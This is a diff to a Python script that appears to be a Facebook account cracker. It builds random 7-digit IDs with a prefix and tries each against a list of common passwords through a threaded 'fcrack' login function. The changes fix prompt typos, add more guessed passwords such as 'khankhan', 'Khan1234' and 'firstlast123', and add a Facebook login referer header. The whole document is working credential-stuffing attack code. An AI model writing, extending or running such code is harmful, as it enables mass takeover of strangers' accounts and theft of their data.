@@ -432,7 +432,7 @@ def random_number1():
 	print(logo)
 	print(' Example : 1000,5000,10000,****Etc')
 	linex()
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -521,7 +521,7 @@ def random_number3():
 	print(logo)
 	linex()
 	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -555,7 +555,7 @@ def random_number4():
 	print(logo)
 	linex()
 	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -569,7 +569,7 @@ def random_number4():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122']
+			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122','khankhan','Khan123','Khan1234','Khan12345','Khan1122','firstlast','first last','firstlast123']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -603,7 +603,7 @@ def random_number5():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122','khan12']
+			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122','khan12','khankhan','firstlast','firstlast123','firstlast12345']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -656,7 +656,7 @@ def bd1():
 	os.system('clear')
 	print(logo)
 	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -842,7 +842,8 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-mode': 'no-cors',
 
             'sec-fetch-dest': 'image',
-
+             
+            'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
 
             'accept-encoding': 'gzip, deflate, br',
 
